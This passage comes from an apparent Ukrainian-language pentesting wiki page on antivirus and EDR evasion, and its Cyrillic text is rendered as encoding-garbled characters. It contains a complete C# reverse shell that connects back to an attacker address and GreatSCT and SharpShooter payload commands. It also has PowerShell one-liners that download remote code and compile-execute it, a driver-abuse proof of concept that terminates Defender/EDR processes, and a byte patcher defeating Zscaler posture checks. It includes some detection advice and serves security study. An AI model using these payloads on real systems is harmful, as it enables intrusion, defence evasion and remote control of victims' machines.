- –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc`, —è–∫—â–æ –≤—ñ–Ω –≤–∂–µ –ø—Ä–∞—Ü—é—î, –∞–±–æ –≤–∏ –≤–∏–∫–ª–∏—á–µ—Ç–µ [–≤—ñ–∫–Ω–æ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è](https://i.imgur.com/1SROTTl.png). –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –ø—Ä–∞—Ü—é—î –≤—ñ–Ω –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `tasklist | findstr winvnc`
- –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc` –±–µ–∑ `UltraVNC.ini` –≤ —Ç–æ–º—É –∂ –∫–∞—Ç–∞–ª–æ–∑—ñ, —ñ–Ω–∞–∫—à–µ –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è [–≤—ñ–∫–Ω–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó](https://i.imgur.com/rfMQWcf.png)
- –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc -h` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–ø–æ–º–æ–≥–∏, –∞–±–æ –≤–∏ –≤–∏–∫–ª–∏—á–µ—Ç–µ [–≤—ñ–∫–Ω–æ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è](https://i.imgur.com/oc18wcu.png)

### GreatSCT

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –π–æ–≥–æ –∑: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
–í—Å–µ—Ä–µ–¥–∏–Ω—ñ GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
–¢–µ–ø–µ—Ä **–ø–æ—á–Ω—ñ—Ç—å –ª—ñ—Å—Ç–∏–Ω–≥** –∑ `msfconsole -r file.rc` —Ç–∞ **–≤–∏–∫–æ–Ω–∞–π—Ç–µ** **xml payload** –∑:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**–ü–æ—Ç–æ—á–Ω–∏–π –∑–∞—Ö–∏—Å–Ω–∏–∫ –¥—É–∂–µ —à–≤–∏–¥–∫–æ –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å.**

### –ö–æ–º–ø—ñ–ª—è—Ü—ñ—è –≤–ª–∞—Å–Ω–æ–≥–æ —Ä–µ–≤–µ—Ä—Å-—à–µ–ª—É

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### –ü–µ—Ä—à–∏–π C# —Ä–µ–≤–µ—Ä—Å-—à–µ–ª

–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ü–µ –∑:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

–°–ø–∏—Å–æ–∫ –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä—ñ–≤ C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è python –¥–ª—è –ø—Ä–∏–∫–ª–∞–¥—É —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —ñ–Ω–∂–µ–∫—Ç–æ—Ä—ñ–≤:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### –Ü–Ω—à—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### –ë—ñ–ª—å—à–µ

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## –ü—Ä–∏–Ω–µ—Å—ñ—Ç—å —Å–≤—ñ–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥—Ä–∞–π–≤–µ—Ä (BYOVD) ‚Äì –í–∏–º–∫–Ω–µ–Ω–Ω—è AV/EDR –∑ –ø—Ä–æ—Å—Ç–æ—Ä—É —è–¥—Ä–∞

Storm-2603 –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–≤ –º–∞–ª–µ–Ω—å–∫—É –∫–æ–Ω—Å–æ–ª—å–Ω—É —É—Ç–∏–ª—ñ—Ç—É, –≤—ñ–¥–æ–º—É —è–∫ **Antivirus Terminator**, —â–æ–± –≤–∏–º–∫–Ω—É—Ç–∏ –∑–∞—Ö–∏—Å—Ç–∏ –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ –ø–µ—Ä–µ–¥ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è–º –ø—Ä–æ–≥—Ä–∞–º-–≤–∏–º–∞–≥–∞—á—ñ–≤. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø—Ä–∏–Ω–æ—Å–∏—Ç—å —Å–≤—ñ–π **–≤—Ä–∞–∑–ª–∏–≤–∏–π, –∞–ª–µ *–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π* –¥—Ä–∞–π–≤–µ—Ä** —ñ –∑–ª–æ–≤–∂–∏–≤–∞—î –Ω–∏–º –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–ø–µ—Ä–∞—Ü—ñ–π —è–¥—Ä–∞, —è–∫—ñ –Ω–∞–≤—ñ—Ç—å —Å–ª—É–∂–±–∏ AV Protected-Process-Light (PPL) –Ω–µ –º–æ–∂—É—Ç—å –∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏.

–ö–ª—é—á–æ–≤—ñ –≤–∏—Å–Ω–æ–≤–∫–∏
1. **–ü—ñ–¥–ø–∏—Å–∞–Ω–∏–π –¥—Ä–∞–π–≤–µ—Ä**: –§–∞–π–ª, —â–æ –¥–æ—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –Ω–∞ –¥–∏—Å–∫, - —Ü–µ `ServiceMouse.sys`, –∞–ª–µ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª - —Ü–µ –ª–µ–≥—ñ—Ç–∏–º–Ω–æ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –¥—Ä–∞–π–≤–µ—Ä `AToolsKrnl64.sys` –∑ "System In-Depth Analysis Toolkit" Antiy Labs. –û—Å–∫—ñ–ª—å–∫–∏ –¥—Ä–∞–π–≤–µ—Ä –º–∞—î –¥—ñ–π—Å–Ω–∏–π –ø—ñ–¥–ø–∏—Å Microsoft, –≤—ñ–Ω –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –Ω–∞–≤—ñ—Ç—å –∫–æ–ª–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–æ Enforcement (DSE) –ø—ñ–¥–ø–∏—Å—É –¥—Ä–∞–π–≤–µ—Ä–∞.
2. **–í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Å–ª—É–∂–±–∏**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
–ü–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ —Ä–µ—î—Å—Ç—Ä—É—î –¥—Ä–∞–π–≤–µ—Ä —è–∫ **—Å–µ—Ä–≤—ñ—Å —è–¥—Ä–∞**, –∞ –¥—Ä—É–≥–∏–π –∑–∞–ø—É—Å–∫–∞—î –π–æ–≥–æ, —â–æ–± `\\.\ServiceMouse` —Å—Ç–∞–≤ –¥–æ—Å—Ç—É–ø–Ω–∏–º –∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É.
3. **IOCTL, —è–∫—ñ –Ω–∞–¥–∞—î –¥—Ä–∞–π–≤–µ—Ä**
| –ö–æ–¥ IOCTL | –ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å                              |
|-----------:|-----------------------------------------|
| `0x99000050` | –ó–∞–≤–µ—Ä—à–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –∑–∞ PID (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑—É–ø–∏–Ω–∫–∏ —Å–ª—É–∂–± Defender/EDR) |
| `0x990000D0` | –í–∏–¥–∞–ª–∏—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É |
| `0x990001D0` | –í–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥—Ä–∞–π–≤–µ—Ä —ñ –≤–∏–¥–∞–ª–∏—Ç–∏ —Å–ª—É–∂–±—É |

–ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î**: BYOVD –ø–æ–≤–Ω—ñ—Å—Ç—é –æ–±—Ö–æ–¥–∏—Ç—å –∑–∞—Ö–∏—Å—Ç–∏ —Ä–µ–∂–∏–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞; –∫–æ–¥, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤ —è–¥—Ä—ñ, –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ *–∑–∞—Ö–∏—â–µ–Ω—ñ* –ø—Ä–æ—Ü–µ—Å–∏, –∑–∞–≤–µ—Ä—à—É–≤–∞—Ç–∏ —ó—Ö –∞–±–æ –≤—Ç—Ä—É—á–∞—Ç–∏—Å—è –≤ –æ–±'—î–∫—Ç–∏ —è–¥—Ä–∞ –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ PPL/PP, ELAM –∞–±–æ —ñ–Ω—à–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π –∑–∞—Ö–∏—Å—Ç—É.

–í–∏—è–≤–ª–µ–Ω–Ω—è / –ü–æ–º'—è–∫—à–µ–Ω–Ω—è
‚Ä¢ –£–≤—ñ–º–∫–Ω—ñ—Ç—å —Å–ø–∏—Å–æ–∫ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –¥—Ä–∞–π–≤–µ—Ä—ñ–≤ Microsoft (`HVCI`, `Smart App Control`), —â–æ–± Windows –≤—ñ–¥–º–æ–≤–∏–≤—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ `AToolsKrnl64.sys`.
‚Ä¢ –ú–æ–Ω—ñ—Ç–æ—Ä—Ç–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö *—è–¥—Ä–æ–≤–∏—Ö* —Å–ª—É–∂–± —ñ —Å–ø–æ–≤—ñ—â–∞–π—Ç–µ, –∫–æ–ª–∏ –¥—Ä–∞–π–≤–µ—Ä –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ –∫–∞—Ç–∞–ª–æ–≥—É, –¥–æ—Å—Ç—É–ø–Ω–æ–≥–æ –¥–ª—è –∑–∞–ø–∏—Å—É –∑ —É—Å—å–æ–≥–æ —Å–≤—ñ—Ç—É, –∞–±–æ –Ω–µ –ø—Ä–∏—Å—É—Ç–Ω—ñ–π —É —Å–ø–∏—Å–∫—É –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö.
‚Ä¢ –°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞–º–∏ —Ä–µ–∂–∏–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ –æ–±'—î–∫—Ç—ñ–≤ –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤, –∑–∞ —è–∫–∏–º–∏ —Å–ª—ñ–¥—É—é—Ç—å –ø—ñ–¥–æ–∑—Ä—ñ–ª—ñ –≤–∏–∫–ª–∏–∫–∏ `DeviceIoControl`.

### –û–±—Ö—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –ø–æ–∑–∏—Ü—ñ—ó Zscaler Client Connector —á–µ—Ä–µ–∑ –ø–∞—Ç—á–∏–Ω–≥ –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –Ω–∞ –¥–∏—Å–∫—É

**Client Connector** Zscaler –∑–∞—Å—Ç–æ—Å–æ–≤—É—î –ø—Ä–∞–≤–∏–ª–∞ –ø–æ–∑–∏—Ü—ñ—ó –ø—Ä–∏—Å—Ç—Ä–æ—é –ª–æ–∫–∞–ª—å–Ω–æ —ñ –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –Ω–∞ Windows RPC –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ–≤ —ñ–Ω—à–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º. –î–≤–∞ —Å–ª–∞–±–∫—ñ –¥–∏–∑–∞–π–Ω–µ—Ä—Å—å–∫—ñ —Ä—ñ—à–µ–Ω–Ω—è —Ä–æ–±–ª—è—Ç—å –ø–æ–≤–Ω–∏–π –æ–±—Ö—ñ–¥ –º–æ–∂–ª–∏–≤–∏–º:

1. –û—Ü—ñ–Ω–∫–∞ –ø–æ–∑–∏—Ü—ñ—ó –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è **–ø–æ–≤–Ω—ñ—Å—Ç—é –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞** (–ª–æ–≥—ñ—á–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä).
2. –í–Ω—É—Ç—Ä—ñ—à–Ω—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ RPC –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å, —â–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª **–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π Zscaler** (—á–µ—Ä–µ–∑ `WinVerifyTrust`).

–®–ª—è—Ö–æ–º **–ø–∞—Ç—á–∏–Ω–≥—É —á–æ—Ç–∏—Ä—å–æ—Ö –ø—ñ–¥–ø–∏—Å–∞–Ω–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –Ω–∞ –¥–∏—Å–∫—É** –æ–±–∏–¥–≤–∞ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–µ–π—Ç—Ä–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ:

| –ë—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª | –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ –ª–æ–≥—ñ–∫–∞, —â–æ –±—É–ª–∞ –ø–∞—Ç—á–µ–Ω–∞ | –†–µ–∑—É–ª—å—Ç–∞—Ç |
|---------------|--------------------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() ‚Üí return 0/1` | –ó–∞–≤–∂–¥–∏ –ø–æ–≤–µ—Ä—Ç–∞—î `1`, —Ç–æ–º—É –∫–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ —î –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—é |
| `ZSAService.exe` | –ù–µ–ø—Ä—è–º–∏–π –≤–∏–∫–ª–∏–∫ `WinVerifyTrust` | NOP-ed ‚áí –±—É–¥—å-—è–∫–∏–π (–Ω–∞–≤—ñ—Ç—å –Ω–µ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π) –ø—Ä–æ—Ü–µ—Å –º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ RPC —Ç—Ä—É–±–æ–∫ |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | –ó–∞–º—ñ–Ω–µ–Ω–æ –Ω–∞ `mov eax,1 ; ret` |
| `ZSATunnel.exe` | –ü–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ç—É–Ω–µ–ª—é | –°–∫–æ—Ä–æ—á–µ–Ω–æ | 

–ú—ñ–Ω—ñ–º–∞–ª—å–Ω–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –ø–∞—Ç—á–µ—Ä–∞:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
–ü—ñ—Å–ª—è –∑–∞–º—ñ–Ω–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ —ñ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫—É —Å—Ç–µ–∫—É —Å–µ—Ä–≤—ñ—Å—ñ–≤:

* **–£—Å—ñ** –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å—Ç–∞–Ω—É –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å **–∑–µ–ª–µ–Ω–∏–π/–≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π**.
* –ù–µ–ø—ñ–¥–ø–∏—Å–∞–Ω—ñ –∞–±–æ –º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ –º–æ–∂—É—Ç—å –≤—ñ–¥–∫—Ä–∏–≤–∞—Ç–∏ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ RPC –∑ —ñ–º–µ–Ω–æ–≤–∞–Ω–∏–º–∏ —Ç—Ä—É–±–∞–º–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* –°–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —Ö–æ—Å—Ç –æ—Ç—Ä–∏–º—É—î –Ω–µ–æ–±–º–µ–∂–µ–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ, –≤–∏–∑–Ω–∞—á–µ–Ω–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∞–º–∏ Zscaler.

–¶–µ–π –≤–∏–ø–∞–¥–æ–∫ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ —á–∏—Å—Ç–æ –∫–ª—ñ—î–Ω—Ç—Å—å–∫—ñ —Ä—ñ—à–µ–Ω–Ω—è —â–æ–¥–æ –¥–æ–≤—ñ—Ä–∏ —Ç–∞ –ø—Ä–æ—Å—Ç—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—ñ–≤ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±—ñ–π–¥–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫—ñ–ª—å–∫–æ—Ö –ø–∞—Ç—á—ñ–≤ –±–∞–π—Ç—ñ–≤.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [Unit42 ‚Äì New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv ‚Äì Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research ‚Äì Before ToolShell: Exploring Storm-2603‚Äôs Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
